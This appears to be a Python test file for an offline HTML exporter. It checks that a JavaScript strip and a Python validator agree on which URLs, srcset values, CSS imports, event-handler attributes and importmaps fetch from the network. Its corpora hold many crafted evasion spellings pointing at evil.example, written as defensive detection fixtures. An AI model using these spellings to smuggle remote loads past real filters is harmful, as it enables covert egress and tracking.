        # Trailing padding is stripped like leading padding. `https://` with a trailing space is the
        # row that pins it: with the trailing strip the value is an EMPTY authority and local, and
        # without it the space reads as the first character of a host.
        ("https://evil.example/x.js ", True), ("\u001fhttps://evil.example/x.js\u0000", True),
        ("https:// ", False), ("https://?q ", False), ("// ", False),
        # `file:` with an AUTHORITY is an off-machine load: on Windows it resolves to an SMB UNC
        # path, so it beacons exactly like an http one, and no `file://` document's CSP stops the
        # navigation it can carry. How many separators open that authority was CHECKED in a real
        # Chromium rather than read off the spec: exactly two, or four-or-more, give a host, while
        # THREE is the empty host of an ordinary local path.
        ("file://evil.example/x.js", True), ("FILE://evil.example/x.js", True),
        ("file:\\\\evil.example/x.js", True), ("file:////evil.example/x.js", True),
        ("file://///evil.example/x.js", True), ("file:///\\evil.example/x.js", True),
        # ...but the `file:` spellings that stay on the machine are not. A third slash means an
        # EMPTY host, `localhost` is the local machine by definition, and a Windows DRIVE LETTER is
        # turned into a path rather than a host by the file-host state - `file://C:/x` is the same
        # local file as `file:///C:/x`, and it is the spelling Windows tools paste. Reporting any of
        # them would delete an author's local reference and reject a file with no egress at all.
        # The FIVE-slash rows pin the backtracking guard: a greedy `/{4,}` alone gives a slash back
        # when a lookahead fails and then matches on the four-slash reading, so these came out
        # network until the run was made unbacktrackable.
        ("file:///C:/local/x.js", False), ("file:///x.js", False),
        ("file://localhost/x.js", False), ("file://localhost", False),
        ("file:////localhost/x.js", False), ("file://C:/local/x.js", False),
        ("file://c|/local/x.js", False), ("file://C:\\local\\x.js", False),
        ("file:////C:/local/x.js", False), ("file://", False), ("file://?q", False),
        ("file://///localhost/x.js", False), ("file://///C:/local/x.js", False),
        ("file://///c|/local/x.js", False), ("file://///?q", False), ("file://///", False),
        ("file://////localhost/x.js", False),
        # A real Chromium resolves EVERY `file://` authority that STARTS with a drive letter to a
        # local drive path with an EMPTY host, separator or no separator, so what looks like a host
        # after one is really a path segment.
        ("file://C:foo/x.js", False), ("file://c|foo", False), ("file://a:8080/x.js", False),
        ("file://c:evil.example/x.js", False), ("file:////C:foo/x.js", False),
        # A SINGLE leading slash or backslash is a path, not an authority, and a backslash deeper
        # inside a relative reference leaves it relative.
        ("\\relative\\x.js", False), ("/root\\relative.js", False), ("file:x.js", False),
        ("file:/x.js", False),
        # An authority terminated at once by `?`, `#` or the end of the value is an EMPTY host,
        # which nothing fetches from: a special scheme fails to parse outright (checked in a real
        # Chromium), and from a `file:` document it is the local root. The third of these is the
        # Windows extended-length path `\\?\C:\x`, which the backslash mapping turns into `//?/C:/x`.
        ("//", False), ("//?q", False), ("//#f", False), ("https://", False),
        ("https://?q", False), ("\\\\?\\C:\\x", False),
        # ...but a host of `.` (the Windows device path `\\.\C:\x`) really does parse to a host, and
        # a loopback SMB share is still egress off the document, so both stay flagged. Note that
        # `\\localhost\C$\x` is True while `file:////localhost/x.js` is False: the backslash spelling
        # normalizes to a scheme-relative `//localhost/...` and is judged by the http/https arm,
        # which deliberately carries NO `localhost` exclusion - an authority-bearing UNC share is
        # egress even to the loopback, while the direct `file://localhost/...` spelling is the
        # ordinary way to name a local file and stays local.
        ("\\\\.\\C:\\x", True), ("\\\\localhost\\C$\\x", True),
    ]

    # `srcset` is the one attribute whose value is a LIST, so the candidate boundary is decided
    # before the URL predicate ever sees a value - and HTML's parser draws that boundary at ASCII
    # whitespace only (tab, LF, FF, CR, space). Tokenizing with the engine's own whitespace both
    # HID a real load from both sides (U+000B is engine whitespace but not ASCII whitespace, so the
    # candidate was cut there) and drifted between the engines (Python's `str.strip()` takes
    # U+001C-U+001F, JS's `trim()` takes U+FEFF). Pinned with expected verdicts for the same reason
    # as the corpus above.
    _SRCSET_CORPUS = [
        ("local.png 1x, local-2x.png 2x", False),
        ("https://evil.example/x.png 1x", True),
        ("local.png 1x, //evil.example/x.png 2x", True),
        ("https:/\\evil.example/x.png 1x", True),
        ("file://evil.example/x.png 1x", True),
        ("\u0001\u000b//evil.example/x.png 1x", True),
        ("\u001f\u000b//evil.example/x.png 1x", True),
        ("\t\ufeff//evil.example/x.png 1x", False),
        ("\ufeffhttps://evil.example/x.png 1x", False),
        ("   \t local.png   1x  ", False),
        # A candidate whose only unusual character is U+001C: the VERDICT is the same either way, so
        # this row exists for the TOKEN comparison below - Python's old `str.strip()`/`str.split()`
        # cut it into three tokens where HTML keeps one, and only comparing the tokenizers' OUTPUT
        # catches a revert on the Python side.
        ("a\u001cb.png 1x", False), ("\u000b//evil.example/x.png 1x", True),
        # A comma INSIDE the URL run: HTML collects the whole run, so this really does request
        # `https://,evil.example/x.png` (measured in a real Chromium), while a comma-split alone
        # tests the truncated `https://` - an empty authority, and local.
        ("https://,evil.example/x.png 1x", True), ("//,evil.example/x.png 1x", True),
        ("file://,evil.example/x.png 1x", True),
        # ...and two candidates separated by a comma with no space around it, which the
        # whitespace-run reading alone would join into one non-matching token.
        ("local.png 1x,https://evil.example/x.png 2x", True),
        ("", False), (",", False), ("   ", False),
        ("data:image/gif;base64,R0lGODlhAQABAAAAACw= 1x", False),
        (",local.png 1x,", False), ("local.png 1x 2x, local-2.png 100w", False),
    ]

    def _runtime_network_url_source(self):
        """The exporter's whole network-URL decision, as JS source, for evaluation in node.

        Extracted as one contiguous region rather than as the bare regex literal: the decision is
        the URL parser's input cleanup, the literal test, and the `srcset` candidate boundary, and
        reading only the pattern would keep passing after any of the others drifted - the very drift
        this parity test exists to catch.
        """
        source = self._read("68-export-offline.js")
        start = source.find("function _offlineNormalizeUrlValue(")
        self.assertNotEqual(start, -1,
                            "the runtime no longer defines _offlineNormalizeUrlValue; the parity "
                            "extraction is stale and must be re-pointed at whatever replaced it")
        end = source.find("function _offlineSrcsetHasNetwork(", start)
        self.assertNotEqual(end, -1,
                            "the runtime no longer defines _offlineSrcsetHasNetwork after the "
                            "normalizer; the parity extraction is stale")
        end = source.find("\n}", end)
        self.assertNotEqual(end, -1, "could not find the end of _offlineSrcsetHasNetwork")
        region = source[start:end + 2]
        for name in ("_OFFLINE_NETWORK_URL_RE", "_offlineIsNetworkUrl", "_OFFLINE_SRCSET_WS_RE",
                     "_offlineSrcsetCandidateUrl", "_offlineSrcsetCandidateUrls"):
            self.assertIn(name, region,
                          "%s is no longer inside the extracted network-URL region, so the parity "
                          "check would run a partial copy of the decision" % name)
        # A region that stopped early (a helper inserted between the two anchors whose body ends in
        # a column-0 `}`) would evaluate a TRUNCATED predicate, so require it to close cleanly AND
        # to be the LAST closing brace in the file's own extraction window - `endswith("}")` alone
        # is satisfied by any column-0 brace, including one inside the function.
        self.assertTrue(region.rstrip().endswith("}"),
                        "the extracted network-URL region does not end at a closing brace, so the "
                        "parity check would evaluate a truncated copy of the decision")
        self.assertEqual(region.count("function _offlineSrcsetHasNetwork("), 1,
                         "the extracted region does not carry exactly one _offlineSrcsetHasNetwork "
                         "definition, so the parity check would run a partial copy")
        self.assertEqual(region.count("{") - region.count("}"), 0,
                         "the extracted network-URL region has unbalanced braces, so it was cut "
                         "mid-function and the parity check would evaluate a truncated copy")
        return region

    def test_the_python_and_js_network_url_predicates_agree(self):
        """Run the runtime's own network-URL predicate in node and require the expected verdicts.

        The whole predicate is extracted and evaluated rather than just its regex, because the
        decision is now two parts - the URL parser's input cleanup and the literal test - and a
        check that read only the pattern would pass while the normalizer drifted. Compiling the
        extracted JS text with Python's `re` could only ever prove what PYTHON does with it, and
        the point of spelling the whitespace class out is an ENGINE difference. Skipped when node
        is absent, the way the repo's other node-gated checks degrade.
        """
        for value, expected in self._NETWORK_URL_CORPUS:
            self.assertEqual(
                resources.is_network_url(value), expected,
                "the validator's network-URL predicate calls %r %s. A miss is a remote load the "
                "gate certifies as offline-clean; a false hit rejects a file the exporter just "
                "produced." % (value, "local" if expected else "a network URL"))
        for value, expected in self._SRCSET_CORPUS:
            self.assertEqual(
                resources.srcset_has_network(value), expected,
                "the validator's srcset predicate calls %r %s" % (value, "local" if expected else "a network URL"))
        node = shutil.which("node")
        if not node:
            self.skipTest("node is not on PATH; the JS-engine parity check needs it")
        payload = {"corpus": [value for value, _ in self._NETWORK_URL_CORPUS],
                   "srcset": [value for value, _ in self._SRCSET_CORPUS]}
        script = (
            self._runtime_network_url_source() + "\n"
            + "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
            "const p=JSON.parse(raw);process.stdout.write(JSON.stringify({"
            "corpus:p.corpus.map(s=>_offlineIsNetworkUrl(s)),"
            "srcset:p.srcset.map(s=>_offlineSrcsetHasNetwork(s)),"
            "tokens:p.srcset.map(s=>_offlineSrcsetCandidateUrls(s))}));});"
        )
        proc = subprocess.run([node, "-e", script], input=json.dumps(payload),
                              capture_output=True, text=True, encoding="utf-8")
        self.assertEqual(proc.returncode, 0,
                         "node could not evaluate the network-URL predicate: %s" % proc.stderr)
        verdicts = json.loads(proc.stdout)
        self.assertEqual(len(verdicts["corpus"]), len(self._NETWORK_URL_CORPUS),
                         "node returned %d verdicts for %d samples"
                         % (len(verdicts["corpus"]), len(self._NETWORK_URL_CORPUS)))
        self.assertEqual(len(verdicts["srcset"]), len(self._SRCSET_CORPUS),
                         "node returned %d srcset verdicts for %d samples"
                         % (len(verdicts["srcset"]), len(self._SRCSET_CORPUS)))
        for (value, expected), js_says in zip(self._NETWORK_URL_CORPUS, verdicts["corpus"]):
            self.assertEqual(
                js_says, expected,
                "the runtime's _offlineIsNetworkUrl calls %r %s, so the strip and the validator "
                "have diverged. A value only one of them calls a network URL is either a remote "
                "load the gate blesses, or an exported file its own --strict run rejects."
                % (value, "local" if expected else "a network URL"))
        for (value, expected), js_says in zip(self._SRCSET_CORPUS, verdicts["srcset"]):
            self.assertEqual(
                js_says, expected,
                "the runtime's _offlineSrcsetHasNetwork calls %r %s, so the strip and the "
                "validator have diverged about a srcset candidate boundary."
                % (value, "local" if expected else "a network URL"))
        # The TOKENS, not only the verdict: a candidate boundary can drift without changing any
        # verdict in this corpus, and the boundary is the half of the srcset decision the URL
        # predicate cannot see.
        for (value, _), js_tokens in zip(self._SRCSET_CORPUS, verdicts["tokens"]):
            self.assertEqual(
                js_tokens, resources.srcset_candidate_urls(value),
                "the runtime's _offlineSrcsetCandidateUrl and the validator's "
                "srcset_candidate_urls tokenize %r differently (%r vs %r). HTML splits candidates "
                "on ASCII whitespace only; an engine-whitespace split hides a load from whichever "
                "side cuts the candidate short."
                % (value, js_tokens, resources.srcset_candidate_urls(value)))

    # The CSS half of the same decision, and the one the offline CSP is not allowed to stand in
    # for: the validator's gates (`CSS_NETWORK_URL_RE` and `CSS_NETWORK_IMPORT_RE`) and the
    # exporter's own strips (`_offlineCssNoNetwork`) are two independent spellings of "this
    # stylesheet reaches the network", so a drift between them is the CMH-OFFLINE-04 failure mode
    # in its purest form - the gate rejects a file the exporter has just produced, or blesses one
    # the strip would have cleaned. Each row carries its EXPECTED verdict rather than only being
    # compared across the engines, because two copies that under-detect the same spelling agree
    # perfectly - which is how the scheme-only shape below sat in both of them (#961).
    _CSS_NETWORK_CORPUS = [
        ("a { background: url(https://evil.example/x.png); }", True),
        ('a { background: url("https://evil.example/x.png"); }', True),
        ("a { background: url('//evil.example/x.png'); }", True),
        ("a { background: url( //evil.example/x.png ); }", True),
        # Scheme-only and single-slash: no `//` after the colon, and a browser resolves both to the
        # same host through the special-authority states, which ignore the slash run entirely.
        ("a { background: url(https:evil.example/x.png); }", True),
        ("a { background: url(HTTPS:evil.example/x.png); }", True),
        ("a { background: url(https:/evil.example/x.png); }", True),
        ("a { background: url(https:///evil.example/x.png); }", True),
        ('a { background: url("http:evil.example/x.png"); }', True),
        ('@import "https://evil.example/t.css";', True),
        ('@import "https:evil.example/t.css";', True),
        ("@import url(https:evil.example/t.css);", True),
        ("@import url('//evil.example/t.css');", True),
        ("@import url(HTTP:/evil.example/t.css);", True),
        # The at-rule's PRELUDE runs past the URL, and it does not have to be terminated at all: a
        # media query, a `layer()` or `supports()` clause, or the end of the sheet ends it just as a
        # `;` does. The strip used to require the terminator immediately after the URL, so the gate
        # reported these while the export left them in - the drift this pair exists to prevent.
        ('@import "https://evil.example/t.css" screen;', True),
        ('@import "https:evil.example/t.css" layer(base);', True),
        ('@import url(https:evil.example/t.css) supports(display: grid) print;', True),
        ('@import "https://evil.example/t.css"', True),
        ("@import url(https:evil.example/t.css)", True),
        ('@media print { @import "https:evil.example/t.css" }', True),
        # A QUOTED value is a CSS string: a `)` or the OTHER quote character inside it belongs to
        # the URL, so reading one as "anything but a paren or a quote" stopped the strip short while
        # the gate still reported the value.
        ('a { background: url("https://evil.example/a)b.png"); }', True),
        ("a { background: url('https://evil.example/a)b.png'); }", True),
        ("a { background: url(\"https:evil.example/a'b.png\"); }", True),
        ('a { background: url(\'https:evil.example/a"b.png\'); }', True),
        ('@import "https://evil.example/a)b.css";', True),
        # A token the CSS tokenizer closes but the author did not: an unterminated `url(`, one whose
        # quote is never closed, and one closed by the OTHER quote. A real Chromium fetches all
        # three, and the strip's well-formed readings left them behind while the gate reported them.
        ("a { background: url(https:evil.example/unterm.png", True),
        ("a { background: url('https:evil.example/untermq.png) }", True),
        ("a { background: url(\"https:evil.example/mq.png') }", True),
        # A space inside an UNQUOTED url token makes it a bad-url token a browser does not fetch, so
        # this is over-detection - but both sides now do it, which is the property that matters: the
        # gate is a prefix matcher and cannot see the bad token, so the strip is what has to agree.
        ("a { background: url(https://evil.exa mple/x.png); }", True),
        # Both strips are BOUNDED so a false hit costs a declaration, never the stylesheet: the
        # import strip reads a quoted URL as a string (so a `;` inside it cannot cut the at-rule
        # short and leave a tail that swallows the rules after it) and stops at `;`, `{`, `}` or a
        # quote; the `url(...)` fallback stops at `;`, `{` and `}`. These two rows pin that a
        # following rule survives.
        ('@import "https://evil.example/a;b.css" screen;.keep{color:#010203}', True),
        ('.a::before{content:"@import https:evil.example/t.css";color:red}.rest{color:blue}', True),
        # A deletion can bring two halves of the sheet together into a NEW reference, so the strip
        # runs to convergence: one pass over this leaves a live `@import "https://b.example/x";`.
        ('@import@import "https://a.example/x"; "https://b.example/x";', True),
        ('@import "https://evil.example/a}b.css"; .rest{color:blue}', True),
        # No whitespace after the at-keyword: a `"` cannot continue an ident, so `@import"x.css";`
        # is a valid at-rule a browser fetches, and a whitespace-only separator read it as text.
        ('@import"https://evil.example/t.css";.keep{color:red}', True),
        ("@import'https:evil.example/t.css';.keep{color:red}", True),
        # An unterminated token - a `url(` closed by a block boundary rather than a `)`, and an
        # `@import` string that is never closed - has to be consumed too, or the gate reports what
        # the strip left behind. The block boundary itself survives, and so does a LOCAL `@import`
        # written after a network one.
        ("a { background: url(https:evil.example/unterm.png }", True),
        ("a { background: url(https:evil.example/unterm.png } b {}", True),
        ('@import "https://evil.example/x', True),
        ("@import 'https://evil.example/x", True),
        ('@import "https:evil.example/x.css"\n@import "./local-safe.css";', True),
        # Deleting a span must never delete a COMMENT's opener and leave its `*/`: that turns
        # commented-out CSS into live CSS - a fetch created by the strip itself, verified in a real
        # Chromium. Neither strip crosses a comment boundary now, so the commented-out import below
        # is removed as text while the comment stays closed, and the rule after it survives.
        ('@import "https://evil.example/x.css" /* note; @import"https://evil.example/y.css"; */'
         "\n.rest{color:red}", True),
        ('/* @import "https://evil.example/x.css" */\n.rest{color:red}', True),
        # The URL PARSER strips leading spaces from the value, so a padded quoted URL fetches
        # exactly like an unpadded one - and a pattern that demanded the scheme immediately after
        # the quote saw a relative reference on both sides.
        ('a { background: url( " https://evil.example/x.png" ); }', True),
        ("a { background: url('\t//evil.example/x.png'); }", True),
        ('@import " https:evil.example/t.css";', True),
        # Left alone: a relative or `data:` reference is the whole control case, and an authority
        # terminated at once is an empty host a special scheme cannot even parse - reporting one
        # would reject a file with no egress at all, and the strip does not touch it either.
        ("a { background: url(x.png); }", False),
        ('a { background: url("./img/x.png"); }', False),
        ("a { background: url(/root-relative.png); }", False),
        ("a { background: url(data:image/gif;base64,AAAA); }", False),
        ('a { background: url("data:image/svg+xml,%3Csvg%20//x%3E"); }', False),
        ("@import url(theme.css);", False),
        ('@import "./theme.css";', False),
        ('@import "./theme.css" screen and (min-width: 40em);', False),
        ("a { background: url(https://); }", False),
        ("a { background: url(//); }", False),
        ('@import "https://";', False),
        ("a { background: url(mailto:someone@example.com); }", False),
        ("a { background: url(#local-fragment); }", False),
        # ASCII case folding only: Python's `re.IGNORECASE` would otherwise fold `s` onto U+017F,
        # which a JS `/i` regex never does and no browser resolves as a scheme, so the gate would
        # reject a stylesheet the strip keeps verbatim.
        ("a { background: url(http\u017f://evil.example/x.png); }", False),
        ('@import "http\u017f://evil.example/t.css";', False),
        # Neither engine's own whitespace class: a JS `\s` takes U+00A0 and U+FEFF where Python's
        # (with `re.ASCII`) does not, and neither is CSS whitespace, so writing `\s` on both sides
        # made the two disagree about exactly these rows. A U+FEFF in the HOST position is a real
        # fetch (IDNA maps it away, so the host resolves), and must be treated as a host character
        # by both; one BEFORE the scheme is not, because a value that does not start with an ASCII
        # scheme letter never parses as a scheme at all and stays a relative reference.
        ("a { background: url(https:\ufeffevil.example/x.png); }", True),
        ("a { background: url(\ufeffhttps:evil.example/x.png); }", False),
        ("a { background: url(\u00a0https://evil.example/x.png); }", False),
    ]

    def _runtime_css_strip_source(self):
        """The exporter's CSS strip, as JS source, for evaluation in node.

        The region starts at the shared pattern pieces rather than at the function, because the two
        compiled patterns live beside it as module-level consts - assembled from strings so the
        file's own source never carries a dynamic-import shape the export's egress scan would read
        as egress and delete this very script over.
        """
        source = self._read("68-export-offline.js")
        self.assertEqual(
            source.count("function _offlineCssNoNetwork("), 1,
            "the runtime declares _offlineCssNoNetwork more than once, so this extraction could "
            "evaluate the dead copy; keep exactly one definition")
        start = source.find("const _OFF_CSS_WS =")
        self.assertNotEqual(start, -1,
                            "the runtime no longer declares the shared CSS pattern pieces; the "
                            "parity extraction is stale and must be re-pointed at what replaced it")
        m = re.compile(r"function _offlineCssNoNetwork\(css\) \{.*?\n\}", re.S).search(source, start)
        self.assertIsNotNone(m, "the runtime no longer declares _offlineCssNoNetwork after the "
                                "shared pattern pieces; the parity extraction is stale")
        region = source[start:m.end()]
        for name in ("_OFFLINE_CSS_IMPORT_RE", "_OFFLINE_CSS_URL_RE", "_offlineCssNoNetwork"):
            self.assertIn(name, region,
                          "%s is no longer inside the extracted CSS-strip region, so the parity "
                          "check would run a partial copy of the decision" % name)
        # A region cut at the first column-0 `}` inside the function would evaluate a TRUNCATED
        # strip and quietly pass, so require it to be brace-balanced - the same guard the
        # network-URL extraction above carries.
        self.assertEqual(region.count("{") - region.count("}"), 0,
                         "the extracted CSS-strip region has unbalanced braces, so it was cut "
                         "mid-function and the parity check would evaluate a truncated copy")
        # A CSS pattern written as a LITERAL here would put the at-keyword's name directly before an
        # opening paren in this file's own source, which the export's dynamic-import egress scan
        # reads as a dynamic import - it deleted the layer's whole script, and the export then
        # failed its own `--strict` run with a missing JS region. The patterns are assembled from
        # string pieces so that shape never appears; this guard keeps a future edit from writing it
        # back as a literal.
        self.assertNotIn(
            "@" + "import(", source,
            "the runtime source now carries the at-keyword name directly before a paren, which the "
            "offline export's dynamic-import egress scan reads as egress and deletes this script "
            "over; keep the CSS patterns assembled from string pieces")
        return region

    def test_the_python_and_js_css_network_predicates_agree(self):
        """The offline CSS strips (JS) and the strict validator's CSS gates (Python) must call the
        SAME stylesheet a network load.

        Both are literal patterns rather than a URL parse, so the pair only holds while they are
        moved together: a stylesheet only the GATE calls network is an exported file its own
        `--strict` run rejects, and one only the STRIP cleans is a file the gate certifies as
        offline-clean while the export rewrites it. The comparison runs the runtime's own source in
        node rather than re-implementing it here, because the engines differ about case folding
        (`re.IGNORECASE` folds `s` onto U+017F; a JS `/i` never does). Skipped when node is absent,
        like the other node-gated checks.
        """
        for css, expected in self._CSS_NETWORK_CORPUS:
            self.assertEqual(
                bool(resources.CSS_NETWORK_URL_RE.search(css)
                     or resources.CSS_NETWORK_IMPORT_RE.search(css)),
                expected,
                "the validator's CSS gates call %r %s. A miss is a remote stylesheet fetch the "
                "gate certifies as offline-clean; a false hit rejects a file the exporter just "
                "produced." % (css, "local" if expected else "a network load"))
        node = shutil.which("node")
        if not node:
            self.skipTest("node is not on PATH; the JS-engine parity check needs it")
        payload = {"corpus": [css for css, _ in self._CSS_NETWORK_CORPUS]}
        script = (
            self._runtime_css_strip_source() + "\n"
            + "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
            "const p=JSON.parse(raw);process.stdout.write(JSON.stringify("
            "p.corpus.map(s=>_offlineCssNoNetwork(s))));});"
        )
        proc = subprocess.run([node, "-e", script], input=json.dumps(payload),
                              capture_output=True, text=True, encoding="utf-8")
        self.assertEqual(proc.returncode, 0,
                         "node could not evaluate the CSS strip: %s" % proc.stderr)
        stripped = json.loads(proc.stdout)
        self.assertEqual(len(stripped), len(self._CSS_NETWORK_CORPUS),
                         "node returned %d results for %d samples"
                         % (len(stripped), len(self._CSS_NETWORK_CORPUS)))
        for (css, expected), out in zip(self._CSS_NETWORK_CORPUS, stripped):
            self.assertEqual(
                out != css, expected,
                "the runtime's _offlineCssNoNetwork %s %r, so the strip and the validator's CSS "
                "gates have diverged. A stylesheet only one of them calls a network load is "
                "either a remote fetch the gate blesses, or an exported file its own --strict run "
                "rejects." % ("rewrote" if out != css else "left", css))
            if expected:
                self.assertNotIn(
                    "evil.example", out,
                    "the runtime's _offlineCssNoNetwork changed %r but left the remote host "
                    "behind, so the exported stylesheet still fetches" % css)
            # A false hit must cost at most the declaration it sits in. Any row that carries a
            # `.keep`/`.rest` marker after the reference asserts that marker survives, so neither
            # strip can run away with the rest of the stylesheet.
            for marker in (".keep{", ".rest{", "local-safe.css"):
                if marker in css:
                    self.assertIn(
                        marker, out,
                        "the exporter's CSS strip swallowed %r out of %r, so a single reference "
                        "took unrelated author CSS with it" % (marker, css))
            # The real contract is a FIXED POINT, not merely "the strip changed something": what
            # the export emits has to pass the gate it is measured by. Asserting only `out != css`
            # is satisfied by a strip that removes part of a reference and leaves the rest, which
            # is exactly the shape an unterminated `url(` used to produce.
            self.assertFalse(
                resources.CSS_NETWORK_URL_RE.search(out)
                or resources.CSS_NETWORK_IMPORT_RE.search(out),
                "the gate still reports %r after the exporter's own strip ran on %r, so "
                "`validate.py --strict` would reject the file the export just produced"
                % (out, css))


    # Attribute-name spellings the two `^on` predicates must agree about. `once`/`onward` are
    # deliberately in the MATCHED set: the exporter's test is literally `/^on/i`, so an attribute
    # merely starting with those two letters is stripped, and a validator that were cleverer than
    # the strip would BLESS an attribute the export takes away.
    _EVENT_HANDLER_ATTR_CORPUS = [
        "onclick", "ONLOAD", "OnClick", "on", "onerror", "onbeforeunload",
        "once", "onward", "o", "n", "", "click", "data-onclick", "xlink:onload",
        " onload", "onload ", "\ton", "o n", "0n", "ON", "oN",
        # Unicode near-misses: Python's str.lower() is Unicode-aware and JS `/i` folds by its own
        # table, so a fullwidth or dotted spelling must be a MISS on both sides, not just one.
        "\uff2f\uff2eclick", "\u0130Nclick", "\u212ao", "\u017fn",
    ]

    def test_the_python_and_js_event_handler_predicates_agree(self):
        """The offline strip (JS) and the strict validator (Python) must call the SAME attribute an
        inline event handler.

        The gap this closes is the CMH-OFFLINE-04 drift shape: the exporter scrubs every `on*`
        attribute, and the validator's offline mode rejects one, so an attribute only ONE of them
        calls a handler is either a live handler the gate blesses or an exported file its own
        `--strict` run rejects. The two are independent spellings (`/^on/i` versus a `[:2].lower()`
        test), and Python's `str.lower()` is Unicode-aware where a JS `/i` regex folds by its own
        table, so the comparison runs the RUNTIME's regex in the real engine rather than
        re-implementing it here. Skipped when node is absent, like the other node-gated checks.
        """
        node = shutil.which("node")
        if not node:
            self.skipTest("node is not on PATH; the JS-engine parity check needs it")
        source = self._read("68-export-offline.js")
        scrub = re.search(r"function _stripOfflineEventHandlers\(doc\) \{(.*?)\n\}", source, re.S)
        self.assertIsNotNone(scrub, "the runtime no longer declares _stripOfflineEventHandlers; "
                                    "the parity check is stale and must be re-pointed at whatever "
                                    "replaced it")
        m = re.search(r"if \(/(.+?)/i\.test\(attr\.name", scrub.group(1))
        self.assertIsNotNone(m, "the event-handler scrub no longer tests attribute names with an "
                                "inline /^on/i regex; the parity check is stale and must be "
                                "re-pointed at whatever replaced it")
        # The pattern is only half the decision: a scrub that kept `/^on/i` but guarded the removal
        # (the shape someone reaches for when they decide `once` should survive after all) would
        # leave both parity tests green while the strip and the gate disagreed - and the exporter's
        # own `--strict` run would then reject the file it had just produced.
        self.assertRegex(scrub.group(1),
                         r'if \(/[^\n/]*/i\.test\(attr\.name \|\| ""\)\) el\.removeAttribute\(attr\.name\);',
                         "the scrub no longer removes the attribute unconditionally on a name "
                         "match; this check compares only the NAME test, so re-point it at "
                         "whatever now decides removal")
        payload = {"pattern": m.group(1), "corpus": self._EVENT_HANDLER_ATTR_CORPUS}
        script = (
            "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
            "const p=JSON.parse(raw);const re=new RegExp(p.pattern,'i');"
            "process.stdout.write(JSON.stringify(p.corpus.map(s=>re.test(String(s||'')))));});"
        )
        proc = subprocess.run([node, "-e", script], input=json.dumps(payload),
                              capture_output=True, text=True, encoding="utf-8")
        self.assertEqual(proc.returncode, 0,
                         "node could not evaluate the event-handler pattern: %s" % proc.stderr)
        verdicts = json.loads(proc.stdout)
        self.assertEqual(len(verdicts), len(self._EVENT_HANDLER_ATTR_CORPUS),
                         "node returned %d verdicts for %d samples"
                         % (len(verdicts), len(self._EVENT_HANDLER_ATTR_CORPUS)))
        for name, js_says in zip(self._EVENT_HANDLER_ATTR_CORPUS, verdicts):
            self.assertEqual(
                js_says, parsing._is_event_handler_attr(name),
                "the runtime's event-handler scrub and the validator's "
                "_is_event_handler_attr disagree about %r. An attribute only one of them calls a "
                "handler is either a live handler the gate blesses, or an exported file its own "
                "--strict run rejects." % name)

    def test_the_validator_handler_view_reaches_what_the_scrub_walk_reaches(self):
        """The two sides must also LOOK in the same places, not just agree on the attribute name.

        This pins the PYTHON half exactly - the validator's view really does reach a self-closed
        foreign element, a `<noscript>` body and a nested-template element - and pins the JS half
        only to the extent a source read can: that the scrub still walks
        `_offlineQueryAll(doc, "*")`, the helper whose own recursion into `<template>` content is
        covered by the offline Playwright spec. It deliberately does NOT claim to execute the
        scrub's walk; a rewrite that keeps that call but changes what it descends would pass here
        and be caught by `tests/49-offline-export.spec.js`, which round-trips these shapes through
        the real exporter in a browser.
        """
        source = self._read("68-export-offline.js")
        m = re.search(r"function _stripOfflineEventHandlers\(doc\) \{(.*?)\n\}", source, re.S)
        self.assertIsNotNone(m, "the runtime no longer declares _stripOfflineEventHandlers")
        self.assertIn("_offlineQueryAll(doc, \"*\")", m.group(1),
                      "the event-handler scrub no longer walks _offlineQueryAll(doc, \"*\"); the "
                      "validator's egress-index view is pinned to that walk, so update both "
                      "together")
        html = ('<div id="commentRoot">'
                '<svg><rect onload="x()"/></svg>'
                '<noscript><button onclick="x()">go</button></noscript>'
                '<template><template><img onerror="x()"></template></template>'
                "</div>")
        seen = {(h["tag"], h["attr"]) for h in parsing._find_event_handler_attrs_egress(html)}
        self.assertEqual(seen, {("rect", "onload"), ("button", "onclick"), ("img", "onerror")},
                         "the validator's handler view no longer reaches every element the "
                         "exporter's DOM walk does: %r" % sorted(seen))

    # (type, attrs, body) tuples the exporter REMOVES and the validator rejects.
    _ACTIVE_DATA_REMOVED = [
        # A ruleset goes whatever it says: `"source": "document"` prefetches the document's own
        # links with no URL literal, so no URL-shaped rule could gate one.
        ("speculationrules", {}, '{"prerender": [{"urls": ["https://evil.example/beacon"]}]}'),
        ("speculationrules", {}, '{"prefetch": [{"source": "document"}]}'),
        ("speculationrules", {}, '{"prerender": [{"urls": ["next.html"]}]}'),
        ("speculationrules", {"src": "rules.json"}, ""),
        ("importmap", {}, '{"imports": {"lib": "https://evil.example/lib.js"}}'),
        ("importmap", {}, '{"imports": {"lib": "//evil.example/lib.js"}}'),
        # A backslash opens an authority for a special scheme exactly as a slash does, in either
        # position, and from a `file:` document that is a UNC fetch.
        ("importmap", {}, '{"imports": {"lib": "/\\\\evil.example/lib.js"}}'),
        ("importmap", {}, '{"imports": {"lib": "\\\\/evil.example/lib.js"}}'),
        ("importmap", {}, '{"imports": {"lib": "\\\\\\\\evil.example/lib.js"}}'),
        # JSON spells the same URL many ways, and the URL parser strips padding and an embedded
        # tab, so a text scan closes one spelling and leaves the rest.
        ("importmap", {}, '{"imports": {"lib": "https:\\/\\/evil.example/lib.js"}}'),
        ("importmap", {}, '{"imports": {"lib": "https:\\u002f\\u002fevil.example/lib.js"}}'),
        ("importmap", {}, '{"imports": {"lib": "  https://evil.example/lib.js"}}'),
        ("importmap", {}, '{"imports": {"lib": "htt\\tps://evil.example/lib.js"}}'),
        # A data:/blob: target maps a bare specifier onto code the document never carried.
        ("importmap", {}, '{"imports": {"lib": "data:text/javascript,export default 1"}}'),
        ("importmap", {}, '{"imports": {"lib": "blob:https://evil.example/x"}}'),
        # A scopes KEY is a reference too.
        ("importmap", {}, '{"scopes": {"https://cdn.example/": {"lib": "./lib.js"}}}'),
        ("importmap", {"src": "map.json"}, '{"imports": {"lib": "./lib.js"}}'),
        # A browser hard-fails an unparseable map, so failing closed loses nothing. Python's json
        # accepts NaN/Infinity by default and JSON.parse does not, so those must fail closed too.
        ("importmap", {}, "not json at all"),
        ("importmap", {}, ""),
        ("importmap", {}, '{"imports": {"lib": NaN}}'),
    ]
    # ...and the ones both must KEEP, so the rule cannot quietly become "delete every block".
    _ACTIVE_DATA_KEPT = [
        ("importmap", {}, '{"imports": {"lib": "./lib.js", "app": "/app.js"}}'),
        ("importmap", {}, '{"imports": {"lib": "../vendor/lib.js"}}'),
